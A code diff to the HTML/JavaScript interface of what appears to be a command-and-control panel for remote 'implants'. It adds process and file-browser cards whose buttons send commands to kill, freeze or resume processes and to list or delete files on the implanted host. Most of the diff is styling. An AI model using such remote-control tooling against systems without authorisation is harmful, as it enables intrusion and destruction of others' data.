@@ -88,6 +88,20 @@
         .sub-header { font-size: 10px; text-transform: uppercase; letter-spacing: 2.5px; color: var(--text-sub); border-bottom: 1px solid var(--secondary); padding-bottom: 9px; margin-right: 2.5px; display: flex; align-items: center; justify-content: space-between; }
         .panel-title { margin-bottom: 22px; font-weight: 300; letter-spacing: 4px; text-align: center; text-transform: uppercase; color: var(--text-color); font-size: 14px; }
         
+        /* Interactive Cards System (Processes / Files) */
+        .item-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); gap: 8px; height: 300px; overflow-y: auto; padding: 4px; scrollbar-width: thin; align-content: flex-start; }
+        .item-grid::-webkit-scrollbar { width: 4px; }
+        .item-grid::-webkit-scrollbar-thumb { background: var(--secondary); border-radius: 2px; }
+        .item-card { background: var(--sub-panel-bg); border: 1px solid rgba(255,255,255,0.04); border-radius: 6px; padding: 12px; cursor: pointer; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); position: relative; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0; }
+        .item-card:hover { border-color: rgba(255,255,255,0.15); transform: translateY(-1px); background: var(--tab-hover); }
+        .item-card.selected { border-color: var(--accent); background: var(--accent-dim); }
+        .item-card.selected::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; background: var(--accent); border-radius: 6px 0 0 6px; }
+        .item-card-hd { display: flex; justify-content: space-between; align-items: center; font-size: 11px; font-weight: 600; color: var(--text-color); letter-spacing: 0.3px; }
+        .item-card-bd { font-size: 10px; color: var(--text-sub); display: flex; flex-direction: column; gap: 4px; }
+        .item-card-row { display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.1); padding: 4px 6px; border-radius: 4px; border: 1px solid transparent; }
+        .item-card.selected .item-card-row { background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.05); }
+        .item-card-row > span:last-child { color: var(--text-color); max-width: 110px; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
+
         .control-item { display: flex; align-items: center; justify-content: space-between; background: rgba(255, 255, 255, 0.01); padding: 12px 14px; border-radius: 6px; border: 1px solid transparent; transition: 0.2s; min-height: 48px; position: relative; overflow: visible; margin-bottom: 2px; }
         .control-item:hover { background: rgba(255, 255, 255, 0.03); border-color: var(--secondary); }
         .control-item label { font-size: 12px; color: var(--text-color); }
@@ -205,14 +219,14 @@
         body.visual-depth-active .sub-panel:hover { transform: translateY(-3px); background: var(--tab-hover); border-color: rgba(255, 255, 255, 0.08); box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
         body.visual-depth-active .control-item:hover { transform: translateY(-2px); background: rgba(255, 255, 255, 0.04); box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
         body.visual-depth-active .button:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
-        body.visual-depth-active .implant-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        body.visual-depth-active .implant-card:hover, body.visual-depth-active .item-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
 
         body.Glow-active .sub-panel:hover { box-shadow: 0 0 var(--glow-spread) var(--glow-color); }
         body.Glow-active .control-item:hover { box-shadow: 0 0 var(--glow-spread) var(--glow-color); }
         body.Glow-active .button:hover, body.Glow-active .switch.on, body.Glow-active .dropdown-selected.active, body.Glow-active .color-trigger.active { box-shadow: 0 0 var(--glow-spread) var(--glow-color); border-color: var(--glow-color) !important; }
 
-        body.Glassmorphism-active .content-panel, body.Glassmorphism-active .sub-panel, body.Glassmorphism-active .implant-card, body.Glassmorphism-active .control-item, body.Glassmorphism-active .dropdown-selected, body.Glassmorphism-active .tabview-container, body.Glassmorphism-active .tab, body.Glassmorphism-active .toggle-notch { backdrop-filter: blur(10px) saturate(160%) !important; -webkit-backdrop-filter: blur(10px) saturate(160%) !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; background: color-mix(in srgb, var(--panel-bg), transparent 30%) !important; }
-        body.Glassmorphism-active .implant-card { background: color-mix(in srgb, var(--sub-panel-bg), transparent 30%) !important; }
+        body.Glassmorphism-active .content-panel, body.Glassmorphism-active .sub-panel, body.Glassmorphism-active .implant-card, body.Glassmorphism-active .item-card, body.Glassmorphism-active .control-item, body.Glassmorphism-active .dropdown-selected, body.Glassmorphism-active .tabview-container, body.Glassmorphism-active .tab, body.Glassmorphism-active .toggle-notch { backdrop-filter: blur(10px) saturate(160%) !important; -webkit-backdrop-filter: blur(10px) saturate(160%) !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; background: color-mix(in srgb, var(--panel-bg), transparent 30%) !important; }
+        body.Glassmorphism-active .implant-card, body.Glassmorphism-active .item-card { background: color-mix(in srgb, var(--sub-panel-bg), transparent 30%) !important; }
         body.Glassmorphism-active .control-item { background: rgba(255, 255, 255, 0.01) !important; }
         body.Glassmorphism-active .button, body.Glassmorphism-active .tool-btn { backdrop-filter: blur(10px) saturate(160%) !important; -webkit-backdrop-filter: blur(10px) saturate(160%) !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; background: color-mix(in srgb, var(--input-bg), transparent 30%) !important; }
         body.Glassmorphism-active .dropdown-options, body.Glassmorphism-active .slider-tooltip, body.Glassmorphism-active .color-popover { backdrop-filter: blur(12px) saturate(170%) !important; -webkit-backdrop-filter: blur(12px) saturate(170%) !important; background: color-mix(in srgb, var(--tab-bg), transparent 35%) !important; }
@@ -514,8 +528,100 @@
             sendImplantCmd('term_cmd', { cmd: val });
         }
 
+        // --- Process & File Handling ---
+        
+        function formatBytes(bytes) {
+            if(bytes === 0) return '0 B';
+            const k = 1024, sizes = ['B', 'KB', 'MB', 'GB', 'TB'], i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+        
+        let selectedPID = null;
         function fetchProcesses() {
-            sendImplantCmd('ps_ls');
+            sendImplantCmd('ps_list');
+        }
+        function selectProcess(pid, el) {
+            selectedPID = pid;
+            document.querySelectorAll('#process-list .item-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+        }
+        function actionProcess(action) {
+            if(!selectedPID) return __orionNotify({Type: 'text', Variant: 'warn', Text: 'No Process Selected', Icon: 'ph ph-warning'});
+            if(action === 'kill') sendImplantCmd('ps_kill', { pid: selectedPID });
+            if(action === 'suspend') sendImplantCmd('ps_suspend', { pid: selectedPID });
+            if(action === 'resume') sendImplantCmd('ps_resume', { pid: selectedPID });
+            setTimeout(fetchProcesses, 1000);
+        }
+        function renderProcesses(procs) {
+            const grid = document.getElementById('process-list');
+            if(!grid) return;
+            if(procs.length === 0) {
+                grid.innerHTML = `<div class="empty-state" style="padding:40px 0;"><i class="ph ph-cpu"></i><p>No Processes Loaded</p></div>`;
+                return;
+            }
+            grid.innerHTML = procs.map(p => {
+                const uptime = p.create_time ? fmtUptime(Math.max(0, Math.floor(Date.now()/1000) - p.create_time)) : '—';
+                const exe = p.exe ? p.exe.split('\\').pop().split('/').pop() : '—';
+                const isRunning = (p.status || '').toLowerCase() === 'running';
+                const statusColor = isRunning ? 'color:var(--accent)' : 'color:var(--text-sub)';
+                return `<div class="item-card ${selectedPID === p.pid ? 'selected' : ''}" onclick="selectProcess(${p.pid}, this)">
+                    <div class="item-card-hd"><span><i class="ph ph-cpu" style="margin-right:4px"></i><span style="max-width:100px;display:inline-block;text-overflow:ellipsis;overflow:hidden;white-space:nowrap;vertical-align:bottom;" title="${p.name}">${p.name}</span></span><span style="color:var(--accent)">PID: ${p.pid}</span></div>
+                    <div class="item-card-bd">
+                        <div class="item-card-row"><span>Status</span><span style="${statusColor}">${p.status||'—'}</span></div>
+                        <div class="item-card-row"><span>Uptime</span><span>${uptime}</span></div>
+                        <div class="item-card-row"><span>Parent PID</span><span>${p.ppid||'—'}</span></div>
+                        <div class="item-card-row"><span>Path</span><span title="${p.exe}">${exe}</span></div>
+                    </div>
+                </div>`;
+            }).join('');
+        }
+        
+        let currentPath = ".";
+        let selectedFile = null;
+        function fetchFiles(path) {
+            sendImplantCmd('file_ls', { path: path || currentPath });
+        }
+        function selectFile(path, el) {
+            selectedFile = path;
+            document.querySelectorAll('#file-list .item-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+        }
+        function actionFile(action) {
+            if(!selectedFile && action !== 'up') return __orionNotify({Type: 'text', Variant: 'warn', Text: 'No File Selected', Icon: 'ph ph-warning'});
+            if(action === 'delete') {
+                sendImplantCmd('file_del', { path: selectedFile });
+                setTimeout(() => fetchFiles(currentPath), 1000);
+            }
+            if(action === 'up') {
+                sendImplantCmd('file_ls', { path: currentPath + '/..' });
+            }
+        }
+        function renderFiles(data) {
+            currentPath = data.path;
+            const pathEl = document.getElementById('current-path-display');
+            if(pathEl) pathEl.textContent = currentPath;
+            const grid = document.getElementById('file-list');
+            if(!grid) return;
+            
+            const items = data.items.sort((a,b) => b.is_dir - a.is_dir || a.name.localeCompare(b.name));
+            if(items.length === 0) {
+                grid.innerHTML = `<div class="empty-state" style="padding:40px 0;"><i class="ph ph-folder-open"></i><p>Directory is Empty</p></div>`;
+                return;
+            }
+            
+            grid.innerHTML = items.map(f => {
+                const icon = f.is_dir ? 'ph-folder' : 'ph-file';
+                const size = f.is_dir ? '—' : formatBytes(f.size);
+                const date = f.mtime ? new Date(f.mtime * 1000).toLocaleDateString() : '—';
+                const safePath = f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+                return `<div class="item-card ${selectedFile === f.path ? 'selected' : ''}" ondblclick="if(${f.is_dir}) fetchFiles('${safePath}')" onclick="selectFile('${safePath}', this)">
+                    <div class="item-card-hd"><span><i class="ph ${icon}" style="margin-right:4px; ${f.is_dir ? 'color:var(--accent)' : ''}"></i><span style="max-width:140px;display:inline-block;text-overflow:ellipsis;overflow:hidden;white-space:nowrap;vertical-align:bottom;" title="${f.name}">${f.name}</span></span></div>
+                    <div class="item-card-bd">
+                        <div class="item-card-row"><span>Size</span><span>${size}</span></div>
+                        <div class="item-card-row"><span>Modified</span><span>${date}</span></div>
+                    </div>
+                </div>`;
+            }).join('');
         }
 
         window.onImplantData = function(ip_port, data) {
@@ -538,9 +644,14 @@
             } else if (data.type === 'sys_info') {
                 const sysContent = document.getElementById('sys-info-content');
                 if(sysContent) sysContent.innerText = data.data;
-            } else if (data.type === 'ps_out') {
-                const psOut = document.getElementById('ps-out');
-                if(psOut) psOut.value = data.data;
+            } else if (data.type === 'ps_list') {
+                renderProcesses(data.data);
+            } else if (data.type === 'file_list') {
+                renderFiles(data.data);
+            } else if (data.type === 'info') {
+                __orionNotify({Type: 'text', Variant: 'good', Text: 'Success', Subtext: data.data, Icon: 'ph ph-check'});
+            } else if (data.type === 'error') {
+                __orionNotify({Type: 'text', Variant: 'bad', Text: 'Error', Subtext: data.data, Icon: 'ph ph-warning-circle'});
             }
         };
 
@@ -872,12 +983,14 @@
                             <div class="wv-toolbar">
                                 <span class="wv-toolbar-title">Options</span>
                                 <div class="wv-sep"></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-arrows-clockwise"></i><span class="tip">Refresh Files</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-cloud-arrow-down"></i><span class="tip">Clone File</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-cloud-arrow-up"></i><span class="tip">Upload File</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-trash"></i><span class="tip">Delete File</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-folders"></i><span class="tip">Move File</span></div>
+                                <div class="tool-btn" onclick="actionFile('up')"><i class="ph ph-arrow-up"></i><span class="tip">Up Directory</span></div>
+                                <div class="tool-btn" onclick="fetchFiles()"><i class="ph ph-arrows-clockwise"></i><span class="tip">Refresh Files</span></div>
+                                <div class="tool-btn" onclick="actionFile('delete')"><i class="ph ph-trash"></i><span class="tip">Delete File</span></div>
                                 <div class="wv-sep"></div>
+                                <div id="current-path-display" style="font-size:10px; color:var(--text-sub); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:200px;">.</div>
+                            </div>
+                            <div id="file-list" class="item-grid">
+                                <div class="empty-state" style="padding:20px 0;"><i class="ph ph-folder-open"></i><p>No Files Loaded</p></div>
                             </div>
                         `}
                     ]},
@@ -886,14 +999,15 @@
                             <div class="wv-toolbar">
                                 <span class="wv-toolbar-title">Options</span>
                                 <div class="wv-sep"></div>
-                                <div class="tool-btn" onclick="fetchProcesses()"><i class="ph ph-arrows-clockwise"></i><span class="tip">Refresh Processes</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-plus"></i><span class="tip">Create Process</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-x"></i><span class="tip">Terminate Process</span></div>
-                                <div class="tool-btn" onclick=""><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze Process</span></div>
-                                <div class="tool-btn" onclick=""><i class="fa-solid fa-droplet"></i><span class="tip">Thaw Process</span></div>
+                                <div class="tool-btn" onclick="fetchProcesses()"><i class="ph ph-arrows-clockwise"></i><span class="tip">Refresh</span></div>
+                                <div class="tool-btn" onclick="actionProcess('kill')"><i class="ph ph-x"></i><span class="tip">Terminate</span></div>
+                                <div class="tool-btn" onclick="actionProcess('suspend')"><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze</span></div>
+                                <div class="tool-btn" onclick="actionProcess('resume')"><i class="fa-solid fa-droplet"></i><span class="tip">Thaw</span></div>
                                 <div class="wv-sep"></div>
                             </div>
-                            <textarea id="ps-out" readonly style="width:100%; height:200px; background:var(--input-bg); color:var(--text-sub); font-family:monospace; font-size:11px; padding:8px; border:1px solid var(--secondary); border-radius:4px; resize:vertical; outline:none; white-space:pre;"></textarea>
+                            <div id="process-list" class="item-grid">
+                                <div class="empty-state" style="padding:20px 0;"><i class="ph ph-cpu"></i><p>No Processes Loaded</p></div>
+                            </div>
                         `}
                     ]},
                     {header:'Intel', span:'fill', controls:[
@@ -1030,8 +1144,8 @@
                     if (lsIco) lsIco.style.display = 'block';
                     const tOut = document.getElementById('term-out');
                     if (tOut) tOut.value = '';
-                    const pOut = document.getElementById('ps-out');
-                    if (pOut) pOut.value = '';
+                    fetchProcesses();
+                    fetchFiles();
                 }, 100);
             }
         }
@@ -1043,7 +1157,7 @@
             if (!ctrl || !ctrl.ui) return '';
             const ui = String(ctrl.ui).toLowerCase();
             if (ui === 'divider') return `<div class="divider"></div>`;
-            if (ui === 'html') return `<div style="padding:4px 0;">${ctrl.content}</div>`;
+            if (ui === 'html') return `<div style="padding:4px 0;width:100%">${ctrl.content}</div>`;
 
             const labelText = ctrl.label ?? '';
             let html = `<div class="control-item"><label>${labelText}</label>`;
@@ -1126,6 +1240,7 @@
                 });
             });
         }
+
         if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', init); } else { init(); }
     </script>
 </body>
